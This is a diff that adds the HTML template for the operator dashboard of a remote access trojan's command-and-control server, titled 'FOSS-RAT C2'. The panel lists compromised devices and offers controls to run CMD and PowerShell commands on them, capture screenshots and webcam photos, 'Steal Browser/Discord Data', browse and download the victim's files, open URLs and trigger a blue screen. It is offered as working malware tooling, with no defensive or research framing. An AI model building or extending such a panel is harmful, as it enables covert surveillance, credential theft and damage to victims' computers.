@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FOSS-RAT C2</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- ===== LEFT PANEL: DEVICES ===== -->
+        <div class="panel devices-panel">
+            <div class="panel-header">
+                <h1>//DEVICES</h1>
+                <div class="device-header-info">
+                    <span id="selected-device">Selected: None</span>
+                    <button id="refresh-btn">REFRESH</button>
+                </div>
+            </div>
+            <div class="panel-content" id="device-list">
+                <!-- Devices will be inserted here by JS -->
+            </div>
+        </div>
+
+        <!-- ===== RIGHT PANEL: COMMANDS & LOGS ===== -->
+        <div class="panel command-panel">
+            <!-- Tabs Navigation -->
+            <div class="tabs">
+                <button class="tab-link active" data-tab="execution">Execution</button>
+                <button class="tab-link" data-tab="system">System</button>
+                <button class="tab-link" data-tab="interaction">Interaction</button>
+                <button class="tab-link" data-tab="filesystem">File System</button>
+            </div>
+
+            <!-- Tab Content -->
+            <div id="execution" class="tab-content active">
+                <div class="command-group">
+                    <input type="text" id="cmd-input" placeholder="Enter CMD command...">
+                    <button class="dispatch-btn" data-command="runcmd" data-input="cmd-input" data-friendly="Run CMD">Execute CMD</button>
+                </div>
+                <div class="command-group">
+                    <input type="text" id="pwsh-input" placeholder="Enter PowerShell command...">
+                    <button class="dispatch-btn" data-command="runpw" data-input="pwsh-input" data-friendly="Run PowerShell">Execute PowerShell</button>
+                </div>
+            </div>
+            <div id="system" class="tab-content">
+                <button class="dispatch-btn full-width" data-command="takescreenshot" data-friendly="Take Screenshot">Take Screenshot</button>
+                <button class="dispatch-btn full-width" data-command="irlpicture" data-friendly="Take Webcam Picture">Take Webcam Picture</button>
+                <button class="dispatch-btn full-width" data-command="systemspecs" data-friendly="Get System Specs">Get System Specs</button>
+                <button class="dispatch-btn full-width" data-command="stealdata" data-friendly="Steal Data" id="danger-btn">Steal Browser/Discord Data</button>
+                <button class="dispatch-btn full-width" data-command="kill" data-friendly="Kill Implant" id="danger-btn">Kill Implant</button>
+                <button class="dispatch-btn full-width" data-command="bsod" data-friendly="Trigger BSOD" id="danger-btn">Trigger BSOD</button>
+            </div>
+            <div id="interaction" class="tab-content">
+                 <div class="command-group">
+                    <input type="text" id="url-input" placeholder="https://example.com">
+                    <button class="dispatch-btn" data-command="openwebsite" data-input="url-input" data-friendly="Open Website">Open URL</button>
+                </div>
+                 <div class="command-group multi-input">
+                    <input type="text" id="notif-title-input" placeholder="Notification Title">
+                    <input type="text" id="notif-msg-input" placeholder="Notification Message">
+                    <button id="show-notification-btn">Show Notification</button>
+                </div>
+            </div>
+            <div id="filesystem" class="tab-content">
+                <div class="command-group">
+                    <input type="text" id="explore-input" placeholder="C:\Users (or leave blank for root drives)">
+                    <button class="dispatch-btn" data-command="explore" data-input="explore-input" data-friendly="Explore Path">Explore Path</button>
+                </div>
+                <div class="command-group">
+                    <input type="text" id="download-input" placeholder="C:\path\to\file.txt on implant">
+                    <button class="dispatch-btn" data-command="download" data-input="download-input" data-friendly="Download File">Download File</button>
+                </div>
+            </div>
+
+            <!-- Log Output -->
+            <div class="log-container">
+                <div class="panel-header"><h1>//LOG_FEED</h1></div>
+                <pre id="log-output"></pre>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
